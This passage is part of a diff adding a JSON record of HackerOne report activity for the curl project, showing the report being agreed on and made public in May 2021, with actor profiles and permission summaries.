dgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=84ff8a0b7c34ee34a86130a3d0d905f8c714119e039bb8bd8ebc21ea987b393c"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "curl"
+    },
+    {
+      "id": 11889347,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-05-26T08:24:10.383Z",
+      "updated_at": "2021-05-26T08:24:10.383Z",
+      "actor": {
+        "username": "nyymi",
+        "cleared": false,
+        "verified": false,
+        "url": "/nyymi",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "curl"
+    },
+    {
+      "id": 11889348,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-05-26T08:24:10.534Z",
+      "updated_at": "2021-05-26T08:24:10.534Z",
+      "actor": {
+        "username": "nyymi",
+        "cleared": false,
+        "verified": false,
+        "url": "/nyymi",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "curl"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
